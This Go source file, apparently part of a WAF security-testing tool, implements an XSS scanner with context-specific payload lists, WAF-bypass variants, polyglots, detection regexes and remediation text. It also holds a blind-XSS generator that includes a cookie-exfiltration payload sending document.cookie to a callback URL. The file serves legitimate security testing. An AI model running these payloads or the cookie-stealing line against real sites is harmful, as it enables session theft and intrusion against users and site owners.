// Package xss provides Cross-Site Scripting (XSS) detection capabilities for security testing.
// It supports reflected, stored, and DOM-based XSS detection with context-aware payloads
// for HTML, attribute, JavaScript, URL, and CSS injection contexts.
package xss

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/regexcache"
	"github.com/waftester/waftester/pkg/ui"
)

// XSSType represents the type of XSS vulnerability
type XSSType string

const (
	XSSReflected XSSType = "reflected"
	XSSStored    XSSType = "stored"
	XSSDOMBased  XSSType = "dom-based"
)

// InjectionContext represents where the payload is reflected
type InjectionContext string

const (
	ContextHTML       InjectionContext = "html"
	ContextAttribute  InjectionContext = "attribute"
	ContextJavaScript InjectionContext = "javascript"
	ContextURL        InjectionContext = "url"
	ContextCSS        InjectionContext = "css"
	ContextUnknown    InjectionContext = "unknown"
)

// Severity levels for vulnerabilities
type Severity string

const (
	SeverityCritical Severity = "critical"
	SeverityHigh     Severity = "high"
	SeverityMedium   Severity = "medium"
	SeverityLow      Severity = "low"
)

// Payload represents an XSS payload
type Payload struct {
	Value       string
	Context     InjectionContext
	Description string
	BypassType  string // WAF bypass technique used
}

// Vulnerability represents a detected XSS vulnerability
type Vulnerability struct {
	Type        XSSType
	Context     InjectionContext
	Description string
	Severity    Severity
	URL         string
	Parameter   string
	Method      string
	Payload     *Payload
	Evidence    string
	Remediation string
	CVSS        float64
}

// ScanResult represents the result of a scan
type ScanResult struct {
	URL             string
	TestedParams    int
	Vulnerabilities []Vulnerability
	StartTime       time.Time
	Duration        time.Duration
}

// TesterConfig holds configuration for the XSS tester
type TesterConfig struct {
	Timeout           time.Duration
	UserAgent         string
	Client            *http.Client
	IncludeBypassOnly bool // Only test WAF bypass payloads
	TestDOMXSS        bool // Test for DOM-based XSS
}

// Tester provides XSS testing capabilities
type Tester struct {
	config   *TesterConfig
	payloads []Payload
	client   *http.Client
}

// DefaultConfig returns a default configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Timeout:           30 * time.Second,
		UserAgent:         ui.UserAgent(),
		IncludeBypassOnly: false,
		TestDOMXSS:        true,
	}
}

// NewTester creates a new XSS tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	client := config.Client
	if client == nil {
		client = &http.Client{
			Timeout: config.Timeout,
		}
	}

	t := &Tester{
		config: config,
		client: client,
	}

	t.payloads = t.generatePayloads()
	return t
}

// generatePayloads generates XSS payloads for all contexts
func (t *Tester) generatePayloads() []Payload {
	var payloads []Payload

	// Basic HTML context payloads
	htmlPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		{`<script>alert(1)</script>`, "Basic script tag", ""},
		{`<script>alert('XSS')</script>`, "Script with string", ""},
		{`<img src=x onerror=alert(1)>`, "Image error handler", ""},
		{`<img src=x onerror="alert(1)">`, "Image error quoted", ""},
		{`<svg onload=alert(1)>`, "SVG onload", ""},
		{`<svg/onload=alert(1)>`, "SVG onload no space", ""},
		{`<body onload=alert(1)>`, "Body onload", ""},
		{`<input onfocus=alert(1) autofocus>`, "Input autofocus", ""},
		{`<marquee onstart=alert(1)>`, "Marquee onstart", ""},
		{`<details open ontoggle=alert(1)>`, "Details ontoggle", ""},
		{`<video><source onerror=alert(1)>`, "Video source error", ""},
		{`<audio src=x onerror=alert(1)>`, "Audio error handler", ""},
		{`<iframe src="javascript:alert(1)">`, "Iframe javascript src", ""},
		{`<object data="javascript:alert(1)">`, "Object javascript data", ""},
		{`<embed src="javascript:alert(1)">`, "Embed javascript src", ""},
		{`<form action="javascript:alert(1)"><input type=submit>`, "Form javascript action", ""},
		{`<a href="javascript:alert(1)">click</a>`, "Anchor javascript href", ""},
		{`<div onmouseover=alert(1)>hover</div>`, "Div mouseover", ""},
		{`<button onclick=alert(1)>click</button>`, "Button onclick", ""},
	}

	for _, p := range htmlPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextHTML,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// Attribute context payloads
	attrPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		{`" onmouseover="alert(1)`, "Attribute breakout mouseover", ""},
		{`' onmouseover='alert(1)`, "Single quote breakout", ""},
		{`" onfocus="alert(1)" autofocus="`, "Attribute breakout focus", ""},
		{`" onclick="alert(1)"`, "Attribute breakout click", ""},
		{`' onclick='alert(1)'`, "Single quote onclick", ""},
		{`"><script>alert(1)</script>`, "Attribute to HTML breakout", ""},
		{`'><script>alert(1)</script>`, "Single quote HTML breakout", ""},
		{`"><img src=x onerror=alert(1)>`, "Attribute to img", ""},
		{`" style="background:url(javascript:alert(1))"`, "Attribute style injection", ""},
		{`" onload="alert(1)`, "Onload in attribute", ""},
	}

	for _, p := range attrPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextAttribute,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// JavaScript context payloads
	jsPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		{`';alert(1)//`, "String breakout single", ""},
		{`";alert(1)//`, "String breakout double", ""},
		{`\';alert(1)//`, "Escaped single quote breakout", ""},
		{`</script><script>alert(1)</script>`, "Script tag breakout", ""},
		{`'-alert(1)-'`, "Arithmetic injection", ""},
		{`"-alert(1)-"`, "Double arithmetic injection", ""},
		{`';alert(String.fromCharCode(88,83,83))//`, "CharCode alert", ""},
		{`\x3cscript\x3ealert(1)\x3c/script\x3e`, "Hex encoded script", ""},
		{`${alert(1)}`, "Template literal injection", ""},
		{`\u003cscript\u003ealert(1)\u003c/script\u003e`, "Unicode encoded", ""},
	}

	for _, p := range jsPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextJavaScript,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// URL context payloads
	urlPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		{`javascript:alert(1)`, "Javascript URL", ""},
		{`javascript:alert('XSS')`, "Javascript URL string", ""},
		{`data:text/html,<script>alert(1)</script>`, "Data URL", ""},
		{`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`, "Base64 data URL", ""},
		{`vbscript:alert(1)`, "VBScript URL (IE)", ""},
		{`javascript:alert(document.domain)`, "Domain alert", ""},
		{`javascript://comment%0Aalert(1)`, "Comment bypass", ""},
		{`java%0ascript:alert(1)`, "Newline in protocol", ""},
		{`java%09script:alert(1)`, "Tab in protocol", ""},
	}

	for _, p := range urlPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextURL,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// CSS context payloads
	cssPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		{`expression(alert(1))`, "CSS expression (old IE)", ""},
		{`</style><script>alert(1)</script>`, "Style breakout", ""},
		{`background:url(javascript:alert(1))`, "Background URL javascript", ""},
		{`behavior:url(xss.htc)`, "Behavior URL (IE)", ""},
		{`-moz-binding:url(xss.xml#xss)`, "Mozilla binding", ""},
	}

	for _, p := range cssPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextCSS,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// WAF bypass payloads
	bypassPayloads := []struct {
		value  string
		desc   string
		bypass string
	}{
		// Case variations
		{`<ScRiPt>alert(1)</sCrIpT>`, "Mixed case script", "case"},
		{`<IMG SRC=x ONERROR=alert(1)>`, "Uppercase img", "case"},

		// Encoding bypasses
		{`<script>alert(1)</script>`, "HTML entity script", "entity"},
		{`<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>`, "Decimal entity", "entity"},
		{`<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>`, "Hex entity", "entity"},
		{`%3Cscript%3Ealert(1)%3C/script%3E`, "URL encoded", "urlencode"},
		{`%253Cscript%253Ealert(1)%253C/script%253E`, "Double URL encoded", "double-urlencode"},

		// Null byte injection
		{`<scr\x00ipt>alert(1)</script>`, "Null byte in tag", "nullbyte"},
		{`<img src=x onerror=al\x00ert(1)>`, "Null byte in function", "nullbyte"},

		// Comment injection
		{`<script>al/**/ert(1)</script>`, "Comment in function", "comment"},
		{`<!--<script>-->alert(1)<!--</script>-->`, "Comment confusion", "comment"},

		// Unicode normalization
		{`<script>ａｌｅｒｔ(1)</script>`, "Fullwidth chars", "unicode"},
		{`＜script＞alert(1)＜/script＞`, "Fullwidth brackets", "unicode"},

		// Obfuscation
		{`<script>eval('al'+'ert(1)')</script>`, "String concatenation", "obfuscation"},
		{`<script>[].constructor.constructor('alert(1)')()</script>`, "Constructor bypass", "obfuscation"},
		{`<script>window['alert'](1)</script>`, "Bracket notation", "obfuscation"},
		{`<script>this['alert'](1)</script>`, "This bracket notation", "obfuscation"},
		{`<script>top['alert'](1)</script>`, "Top bracket notation", "obfuscation"},
		{`<script>self['alert'](1)</script>`, "Self bracket notation", "obfuscation"},
		{`<script>Function('alert(1)')()</script>`, "Function constructor", "obfuscation"},
		{`<script>eval(atob('YWxlcnQoMSk='))</script>`, "Base64 eval", "obfuscation"},

		// Event handler variations
		{`<body onscroll=alert(1)><br><br>...<br>`, "Scroll event", "event"},
		{`<svg><animate onbegin=alert(1)>`, "SVG animate", "event"},
		{`<svg><set onbegin=alert(1)>`, "SVG set", "event"},
		{`<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, "Math context", "nesting"},

		// Protocol obfuscation
		{`<a href="jav&#x09;ascript:alert(1)">click</a>`, "Tab in javascript", "protocol"},
		{`<a href="jav&#x0A;ascript:alert(1)">click</a>`, "Newline in javascript", "protocol"},
		{`<a href="jav&#x0D;ascript:alert(1)">click</a>`, "CR in javascript", "protocol"},

		// Filter evasion
		{`<svg><script>al&#101rt(1)</script>`, "SVG script entity", "svg"},
		{`<svg><script>alert&lpar;1&rpar;</script>`, "SVG named entities", "svg"},
		{`<svg><script>confirm&lpar;1&rpar;</script>`, "SVG confirm", "svg"},

		// DOM clobbering
		{`<form id=alert><input name=call></form>`, "Form clobbering", "clobbering"},
		{`<img name=alert>`, "Img name clobbering", "clobbering"},
	}

	for _, p := range bypassPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Context:     ContextHTML,
			Description: p.desc,
			BypassType:  p.bypass,
		})
	}

	// Filter by bypass only if configured
	if t.config.IncludeBypassOnly {
		var filtered []Payload
		for _, p := range payloads {
			if p.BypassType != "" {
				filtered = append(filtered, p)
			}
		}
		return filtered
	}

	return payloads
}

// GetPayloads returns payloads filtered by context
func (t *Tester) GetPayloads(ctx InjectionContext) []Payload {
	if ctx == "" {
		return t.payloads
	}

	var filtered []Payload
	for _, p := range t.payloads {
		if p.Context == ctx {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// GetBypassPayloads returns only WAF bypass payloads
func (t *Tester) GetBypassPayloads() []Payload {
	var filtered []Payload
	for _, p := range t.payloads {
		if p.BypassType != "" {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// Patterns for detecting XSS reflection
var reflectionPatterns = []*regexp.Regexp{
	regexcache.MustGet(`<script[^>]*>[^<]*alert\s*\([^)]*\)[^<]*</script>`),
	regexcache.MustGet(`<img[^>]+onerror\s*=`),
	regexcache.MustGet(`<svg[^>]+onload\s*=`),
	regexcache.MustGet(`<[a-z]+[^>]+on\w+\s*=\s*["']?[^"'>\s]+`),
	regexcache.MustGet(`javascript:\s*alert`),
	regexcache.MustGet(`<iframe[^>]+src\s*=\s*["']?javascript:`),
	regexcache.MustGet(`<[^>]+style\s*=\s*["'][^"']*expression\s*\(`),
}

// DOM XSS sink patterns
var domSinkPatterns = []*regexp.Regexp{
	regexcache.MustGet(`\.innerHTML\s*=`),
	regexcache.MustGet(`\.outerHTML\s*=`),
	regexcache.MustGet(`document\.write\s*\(`),
	regexcache.MustGet(`document\.writeln\s*\(`),
	regexcache.MustGet(`eval\s*\(`),
	regexcache.MustGet(`setTimeout\s*\(\s*["']`),
	regexcache.MustGet(`setInterval\s*\(\s*["']`),
	regexcache.MustGet(`Function\s*\(`),
	regexcache.MustGet(`\.src\s*=`),
	regexcache.MustGet(`location\s*=`),
	regexcache.MustGet(`location\.href\s*=`),
	regexcache.MustGet(`location\.assign\s*\(`),
	regexcache.MustGet(`location\.replace\s*\(`),
}

// DOM XSS source patterns
var domSourcePatterns = []*regexp.Regexp{
	regexcache.MustGet(`location\.hash`),
	regexcache.MustGet(`location\.search`),
	regexcache.MustGet(`location\.href`),
	regexcache.MustGet(`document\.URL`),
	regexcache.MustGet(`document\.referrer`),
	regexcache.MustGet(`document\.cookie`),
	regexcache.MustGet(`window\.name`),
	regexcache.MustGet(`localStorage\.getItem`),
	regexcache.MustGet(`sessionStorage\.getItem`),
}

// checkReflection checks if the payload is reflected in the response
func checkReflection(body, payload string) (bool, string) {
	// Direct reflection check
	if strings.Contains(body, payload) {
		return true, payload
	}

	// Check for decoded versions
	decoded, _ := url.QueryUnescape(payload)
	if decoded != payload && strings.Contains(body, decoded) {
		return true, decoded
	}

	// Check for HTML entity decoded
	htmlDecoded := strings.ReplaceAll(payload, "&lt;", "<")
	htmlDecoded = strings.ReplaceAll(htmlDecoded, "&gt;", ">")
	htmlDecoded = strings.ReplaceAll(htmlDecoded, "&quot;", `"`)
	if htmlDecoded != payload && strings.Contains(body, htmlDecoded) {
		return true, htmlDecoded
	}

	return false, ""
}

// checkDangerousReflection checks if reflection appears in dangerous context
func checkDangerousReflection(body string) bool {
	for _, pattern := range reflectionPatterns {
		if pattern.MatchString(body) {
			return true
		}
	}
	return false
}

// DetectContext detects the injection context from the response
func DetectContext(body, payload string) InjectionContext {
	payloadPos := strings.Index(body, payload)
	if payloadPos == -1 {
		return ContextUnknown
	}

	// Get context around payload
	start := payloadPos - 100
	if start < 0 {
		start = 0
	}
	end := payloadPos + len(payload) + 100
	if end > len(body) {
		end = len(body)
	}
	context := body[start:end]

	// Check for script context
	if regexcache.MustGet(`<script[^>]*>[^<]*$`).MatchString(context[:payloadPos-start]) {
		return ContextJavaScript
	}

	// Check for style context
	if regexcache.MustGet(`<style[^>]*>[^<]*$`).MatchString(context[:payloadPos-start]) {
		return ContextCSS
	}

	// Check for attribute context
	attrPattern := regexcache.MustGet(`[a-z]+\s*=\s*["'][^"']*$`)
	if attrPattern.MatchString(context[:payloadPos-start]) {
		return ContextAttribute
	}

	// Check for URL context
	if strings.Contains(context, `href="`) || strings.Contains(context, `src="`) {
		return ContextURL
	}

	return ContextHTML
}

// TestParameter tests a single parameter for XSS
func (t *Tester) TestParameter(ctx context.Context, targetURL, param, method string) ([]Vulnerability, error) {
	var vulns []Vulnerability

	for _, payload := range t.payloads {
		select {
		case <-ctx.Done():
			return vulns, ctx.Err()
		default:
		}

		resp, err := t.sendRequest(ctx, targetURL, param, payload.Value, method)
		if err != nil {
			continue
		}

		body, _ := iohelper.ReadBodyDefault(resp.Body)
		resp.Body.Close()
		bodyStr := string(body)

		// Check for reflection
		reflected, evidence := checkReflection(bodyStr, payload.Value)
		if !reflected {
			continue
		}

		// Check if reflection is in dangerous context
		if checkDangerousReflection(bodyStr) {
			injCtx := DetectContext(bodyStr, evidence)

			vulns = append(vulns, Vulnerability{
				Type:        XSSReflected,
				Context:     injCtx,
				Description: fmt.Sprintf("Reflected XSS via %s (%s)", payload.Description, injCtx),
				Severity:    SeverityHigh,
				URL:         targetURL,
				Parameter:   param,
				Method:      method,
				Payload:     &payload,
				Evidence:    evidence,
				Remediation: GetRemediation(),
				CVSS:        6.1,
			})
		}
	}

	// Check for DOM-based XSS indicators
	if t.config.TestDOMXSS {
		domVulns := t.checkDOMXSS(ctx, targetURL)
		vulns = append(vulns, domVulns...)
	}

	return vulns, nil
}

// checkDOMXSS checks for DOM-based XSS patterns in the page
func (t *Tester) checkDOMXSS(ctx context.Context, targetURL string) []Vulnerability {
	var vulns []Vulnerability

	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return vulns
	}
	req.Header.Set("User-Agent", t.config.UserAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return vulns
	}
	defer resp.Body.Close()

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	bodyStr := string(body)

	hasSink := false
	hasSource := false
	var sinkEvidence, sourceEvidence string

	for _, pattern := range domSinkPatterns {
		if match := pattern.FindString(bodyStr); match != "" {
			hasSink = true
			sinkEvidence = match
			break
		}
	}

	for _, pattern := range domSourcePatterns {
		if match := pattern.FindString(bodyStr); match != "" {
			hasSource = true
			sourceEvidence = match
			break
		}
	}

	if hasSink && hasSource {
		vulns = append(vulns, Vulnerability{
			Type:        XSSDOMBased,
			Context:     ContextJavaScript,
			Description: "Potential DOM-based XSS: source flows to sink",
			Severity:    SeverityMedium,
			URL:         targetURL,
			Evidence:    fmt.Sprintf("Source: %s, Sink: %s", sourceEvidence, sinkEvidence),
			Remediation: GetDOMRemediation(),
			CVSS:        5.4,
		})
	}

	return vulns
}

// sendRequest sends an HTTP request with the payload
func (t *Tester) sendRequest(ctx context.Context, targetURL, param, value, method string) (*http.Response, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, err
	}

	var req *http.Request

	if method == "POST" {
		form := url.Values{}
		form.Set(param, value)
		req, err = http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(form.Encode()))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		q := parsedURL.Query()
		q.Set(param, value)
		parsedURL.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", parsedURL.String(), nil)
		if err != nil {
			return nil, err
		}
	}

	req.Header.Set("User-Agent", t.config.UserAgent)

	return t.client.Do(req)
}

// Scan performs a full XSS scan on a URL
func (t *Tester) Scan(ctx context.Context, targetURL string) (*ScanResult, error) {
	startTime := time.Now()
	result := &ScanResult{
		URL:       targetURL,
		StartTime: startTime,
	}

	params := CommonXSSParams()

	for _, param := range params {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(startTime)
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param, "GET")
		if err != nil {
			continue
		}

		result.TestedParams++
		result.Vulnerabilities = append(result.Vulnerabilities, vulns...)
	}

	result.Duration = time.Since(startTime)
	return result, nil
}

// CommonXSSParams returns commonly vulnerable parameter names for XSS
func CommonXSSParams() []string {
	return []string{
		"q", "query", "search", "s",
		"keyword", "keywords", "term",
		"name", "username", "user",
		"email", "mail", "message",
		"title", "subject", "content",
		"text", "body", "comment",
		"input", "value", "data",
		"callback", "redirect", "url",
		"next", "return", "returnUrl",
		"ref", "referrer", "referer",
		"path", "file", "page",
		"id", "item", "product",
		"error", "err", "msg",
	}
}

// AllXSSTypes returns all XSS types
func AllXSSTypes() []XSSType {
	return []XSSType{
		XSSReflected,
		XSSStored,
		XSSDOMBased,
	}
}

// AllContexts returns all injection contexts
func AllContexts() []InjectionContext {
	return []InjectionContext{
		ContextHTML,
		ContextAttribute,
		ContextJavaScript,
		ContextURL,
		ContextCSS,
	}
}

// GetRemediation returns remediation guidance for XSS
func GetRemediation() string {
	return `1. Implement context-aware output encoding/escaping
   - HTML context: HTML entity encode (<>&"')
   - Attribute context: HTML attribute encode
   - JavaScript context: JavaScript encode
   - URL context: URL encode
   - CSS context: CSS encode
2. Use Content Security Policy (CSP) headers
3. Set HttpOnly flag on session cookies
4. Validate and sanitize all user input
5. Use trusted libraries for HTML sanitization (DOMPurify, etc.)
6. Implement X-XSS-Protection header (legacy browsers)
7. Use modern frameworks with automatic escaping
8. Avoid dangerous JavaScript functions (eval, innerHTML)`
}

// GetDOMRemediation returns remediation for DOM-based XSS
func GetDOMRemediation() string {
	return `1. Avoid using dangerous sinks:
   - innerHTML, outerHTML
   - document.write, document.writeln
   - eval, Function constructor
   - setTimeout/setInterval with string arguments
2. Use safe alternatives:
   - textContent instead of innerHTML
   - createElement and appendChild for DOM manipulation
3. Sanitize data from sources before use:
   - location.hash, location.search
   - document.referrer, document.URL
   - window.name, localStorage, sessionStorage
4. Implement strict Content Security Policy
5. Use trusted types API where available`
}

// IsXSSEndpoint checks if a URL likely processes user input
func IsXSSEndpoint(urlStr string) bool {
	indicators := []string{
		"/search", "/query", "/find",
		"/comment", "/post", "/submit",
		"/feedback", "/contact", "/message",
		"/login", "/register", "/profile",
		"/error", "/404", "/500",
		"?q=", "?search=", "?query=",
		"?name=", "?msg=", "?text=",
	}

	lower := strings.ToLower(urlStr)
	for _, indicator := range indicators {
		if strings.Contains(lower, indicator) {
			return true
		}
	}
	return false
}

// GeneratePolyglot generates polyglot XSS payloads that work in multiple contexts
func GeneratePolyglot() []Payload {
	return []Payload{
		{
			Value:       `jaVasCript:/*-/*` + "`" + `/*\` + "`" + `/*'/*"/**/(/* */oNcLiCk=alert() )//`,
			Context:     ContextHTML,
			Description: "Portswigger polyglot",
			BypassType:  "polyglot",
		},
		{
			Value:       `'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>`,
			Context:     ContextHTML,
			Description: "Mario Heiderich polyglot",
			BypassType:  "polyglot",
		},
		{
			Value:       `javascript:"/*'/*` + "`" + `/*-/*` + "`" + `/*\"/*\'/*` + "`" + `/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`,
			Context:     ContextHTML,
			Description: "Ultimate polyglot",
			BypassType:  "polyglot",
		},
	}
}

// GenerateBlindXSSPayloads generates payloads for blind XSS detection
func GenerateBlindXSSPayloads(callbackURL string) []Payload {
	if callbackURL == "" {
		return nil
	}

	return []Payload{
		{
			Value:       fmt.Sprintf(`<script src="%s"></script>`, callbackURL),
			Context:     ContextHTML,
			Description: "External script load",
		},
		{
			Value:       fmt.Sprintf(`<img src="%s">`, callbackURL),
			Context:     ContextHTML,
			Description: "Image ping",
		},
		{
			Value:       fmt.Sprintf(`<img src=x onerror="fetch('%s')">`, callbackURL),
			Context:     ContextHTML,
			Description: "Fetch callback",
		},
		{
			Value:       fmt.Sprintf(`"><script>new Image().src='%s?c='+document.cookie</script>`, callbackURL),
			Context:     ContextHTML,
			Description: "Cookie exfiltration",
		},
	}
}
